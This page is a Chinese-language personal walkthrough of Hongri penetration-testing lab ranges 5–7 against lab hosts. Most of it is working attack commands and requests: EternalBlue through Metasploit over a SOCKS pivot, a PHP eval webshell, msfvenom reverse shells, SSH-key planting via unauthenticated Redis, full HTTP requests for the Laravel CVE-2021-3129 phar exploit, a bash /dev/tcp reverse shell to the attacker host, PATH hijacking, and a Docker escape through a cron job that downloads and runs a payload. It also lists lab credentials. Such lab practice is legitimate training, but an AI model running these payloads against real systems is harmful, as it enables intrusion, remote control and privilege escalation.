<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy bind.exe \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>

<p>启动</p>
<p><img src="C:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20241228111106553.png" alt="image-20241228111106553"></p>
<p>传上去chisel</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241228111255258.png?raw=true" alt="image-20241228111255258"></p>
<p>ubuntu的shell上</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241228111313115.png?raw=true" alt="image-20241228111313115"></p>
<h4 id="编辑proxychains4-conf文件："><a href="#编辑proxychains4-conf文件：" class="headerlink" title="编辑proxychains4.conf文件："></a>编辑proxychains4.conf文件：</h4><p>因为上面server监听的是socks的是1080端口，进下边改掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>

<p>socks4改成5 端口9050换成1080</p>
<p>代理成功的证明如下</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241228115637878.png?raw=true" alt="image-20241228115637878"></p>
<p><strong>探测是否存在永恒之蓝漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 192.168.183.130-131</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><strong>攻击</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks5:127.0.0.1:1080   			</span><br><span class="line">// 挂代理，这个洞很难打。。。。。</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhost 192.168.183.2</span><br><span class="line">set lport 8888</span><br><span class="line">set AutoRunScript post/windows/manage/migrate    // 自动迁移进程</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>怀疑这个代理不稳定</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241228120610015.png?raw=true" alt="image-20241228120610015"></p>
<p>这不知道什么情况，挂这吧</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241228120833250.png?raw=true" alt="image-20241228120833250"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241228124543744.png?raw=true" alt="image-20241228124543744"></p>
<p>这个不是代理的原因,是这个win7有点老旧，容易卡死机，重启一下，重启一分钟之内给打掉就好了</p>
<p>Ubuntu上线cs不会用了</p>
<h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/itchen-2002/p/18412801/to-8tqri</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_50696533/article/details/128482331</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/woshicainiao666/article/details/136253322</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_39583774/article/details/133650244</span><br></pre></td></tr></table></figure>

<h1 id="红日靶场5"><a href="#红日靶场5" class="headerlink" title="+红日靶场5"></a>+红日靶场5</h1><p>密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">win7</span><br><span class="line">sun\heart 123.com</span><br><span class="line">sun\Administrator dc123.com</span><br><span class="line"></span><br><span class="line">2008</span><br><span class="line">sun\admin 2020.com</span><br><span class="line">修改为Lidd123456</span><br></pre></td></tr></table></figure>



<p>进去就是thinkphp5.0，搜版本漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit thinkphp</span><br><span class="line">出现的去找</span><br><span class="line">cd /usr/share/exploitdb/exploits/php/webapps</span><br><span class="line">cat 46150.txt</span><br></pre></td></tr></table></figure>

<p>看有无杀软👇</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<p>写码👇</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; &gt; 121.php</span><br></pre></td></tr></table></figure>

<p>可连蚁剑，接下来传入cms生成码</p>
<p>生成码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.11 LPORT=4444 -f exe &gt; abc.exe </span><br></pre></td></tr></table></figure>

<p>监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.57.8</span><br><span class="line">set lport 4444</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>

<p>不知道为什么msf上线失败，直接走cs</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241229113142251.png?raw=true" alt="image-20241229113142251"></p>
<p>生成黄金票据或白银票据</p>
<p>参考资料–后来复现不出来拿cs自己做了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://drunkmars.top/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_58091216/article/details/130513067</span><br></pre></td></tr></table></figure>

<h1 id="红日靶场6"><a href="#红日靶场6" class="headerlink" title="+红日靶场6"></a>+红日靶场6</h1><p>靶场应该坏了，没做</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V3.2</span><br><span class="line">web\de1ay | 1qaz!QAZ1qaz!QAZ</span><br><span class="line">de1ay\de2ay | 1qaz@WSX!QAZ2wsx   #web机子</span><br></pre></td></tr></table></figure>

<h1 id="红日靶场7"><a href="#红日靶场7" class="headerlink" title="+红日靶场7"></a>+红日靶场7</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用户名密码：</span><br><span class="line">域用户账户和密码如下：</span><br><span class="line">    Administrator：Whoami2021</span><br><span class="line">    whoami：Whoami2021</span><br><span class="line">    bunny：Bunny2021</span><br><span class="line">    moretz：Moretz2021</span><br><span class="line"></span><br><span class="line">Ubuntu 1：</span><br><span class="line">    web：web2021</span><br><span class="line"></span><br><span class="line">Ubuntu 2：</span><br><span class="line">    ubuntu：ubuntu</span><br></pre></td></tr></table></figure>

<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241229153417031.png?raw=true" alt="image-20241229153417031"></p>
<p>出现错误</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241230154112195.png?raw=true" alt="image-20241230154112195"></p>
<p>右上角关机键右边有个设置，在那边能连接，要不就在换个网卡</p>
<h2 id="开打-2"><a href="#开打-2" class="headerlink" title="开打"></a>开打</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241229155805336.png?raw=true?raw=true" alt="image-20241229155805336"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV 192.168.1.157 -p 1-65535</span><br></pre></td></tr></table></figure>

<h3 id="6379端口-radis"><a href="#6379端口-radis" class="headerlink" title="6379端口-radis"></a>6379端口-radis</h3><p>redis-cli -h 192.168.1.157</p>
<p>直接进去了，</p>
<h3 id="打web1"><a href="#打web1" class="headerlink" title="打web1"></a>打web1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redis未授权访问是因为一些Redis服务绑定到公共接口，甚至没有密码身份验证保护，部分Redis 绑定在0.0.0.0:6379，并且没有开启认证（这是Redis的默认配置），而又暴露在公网上，这样就会导致任意用户在可以访问此公网的情况下未授权访问Redis以及读取Redis的数据。</span><br></pre></td></tr></table></figure>

<p>往目标主机写入ssh公钥，先在kali上生成一段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line"></span><br><span class="line">cat key.txt | redis-cli -h 192.168.1.6 -x set xxx</span><br><span class="line">// -x 代表从标准输入读取数据作为该命令的最后一个参数。</span><br></pre></td></tr></table></figure>

<p>然后使用攻击机连接目标机器Redis，分别执行如下命令将ssh公钥写入目标主机：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh    </span><br><span class="line"># 设置redis的备份路径为/root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys    </span><br><span class="line"># 设置保存文件名为authorized_keys</span><br><span class="line">save    </span><br><span class="line"># 将数据保存在目标服务器硬盘上</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241229162858549.png?raw=true" alt="image-20241229162858549"></p>
<p>直接ssh ip 就连上了</p>
<h3 id="打web2"><a href="#打web2" class="headerlink" title="打web2"></a>打web2</h3><p>Laravel v8.29.0 (PHP v7.4.14) 有这个laravel的标识，直接搜cve</p>
<p>用github上的脚本写出的码哥斯拉连不上去，添加数据没有出来的数据，就直接手动发包打（CVE-2021-3129）</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241229175151302.png?raw=true" alt="image-20241229175151302"></p>
<h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><p>poc生成命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php74 -d &quot;phar.readonly=0&quot; ./phpggc Laravel/RCE5 &quot;phpinfo();&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>

<p>①清除日志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.1.157:81</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 330</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>②log加前缀对齐</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.1.157:81</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 165</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>③将POC作为viewFile的值，发送数据包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.1.157:81</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5050</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line"> &quot;parameters&quot;: &#123;</span><br><span class="line">  &quot;variableName&quot;:&quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=66=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=4F=00=71=00=2B=00=35=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=4F=00=71=00=2B=00=35=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=54=00=67=00=6A=00=72=00=5A=00=4C=00=35=00=2F=00=43=00=56=00=58=00=4B=00=44=00=62=00=37=00=76=00=54=00=59=00=6B=00=47=00=48=00=5A=00=6B=00=58=00=6D=00=67=00=4A=00=77=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a&quot;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>④清空log文件中的干扰字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.1.157:81</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 299</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⑤执行反序列化phar:&#x2F;&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.1.157:81</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 210</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241230134508535.png?raw=true" alt="image-20241230134508535"></p>
<p>换成一句话木马poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d &quot;phar.readonly=0&quot; ./phpggc Laravel/RCE5 &quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>

<p>然后查看是docker里面，然后蚁剑插件的命令执行弹个shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.129/444 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><p><img src="https://github.com/DDL08/images/blob/img/img/image-20241230161756136.png?raw=true" alt="image-20241230161756136"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH </span><br><span class="line">export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span><br><span class="line">cd /home/jobs</span><br><span class="line">./shell</span><br><span class="line"># 然后就获得了root权限，可以执行命令了</span><br></pre></td></tr></table></figure>

<h4 id="docker逃逸-1"><a href="#docker逃逸-1" class="headerlink" title="docker逃逸"></a>docker逃逸</h4><h5 id="Docker-runC漏洞逃逸"><a href="#Docker-runC漏洞逃逸" class="headerlink" title="Docker runC漏洞逃逸"></a>Docker runC漏洞逃逸</h5><p>该漏洞（CVE-2019-5736）是2019年爆出的。在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p>
<p>利用该漏洞需要满足以下两个条件之一：</p>
<blockquote>
<p>由一个攻击者控制的恶意镜像创建</p>
<p>攻击者具有某已存在容器的写权限，且可通过docker exec进入</p>
</blockquote>
<p>首先下载攻击脚本： <a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go    送镜像里，然后升root运行重启</span><br></pre></td></tr></table></figure>

<p>镜像干坏了，换个方法</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241230165447704.png?raw=true" alt="image-20241230165447704"></p>
<h5 id="Docker-特权模式逃逸cron"><a href="#Docker-特权模式逃逸cron" class="headerlink" title="Docker 特权模式逃逸cron"></a>Docker 特权模式逃逸cron</h5><p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p>
<p>首先使用metasploit的web_delivery模块生成payload命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 7    </span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.129</span><br><span class="line">set lport 225</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>将生成的码写入计划任务,执行后去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * wget -qO 6Qmvr849 --no-check-certificate http://192.168.1.129:8080/MUDGZd; chmod +x 6Qmvr849; ./6Qmvr849&amp; disown&#x27; &gt;&gt; /tet/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /tet/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>

<p>计划任务不好使</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl status cron</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install cron</span><br><span class="line">sudo service cron start</span><br><span class="line">看系统日志journalctl -xe</span><br></pre></td></tr></table></figure>

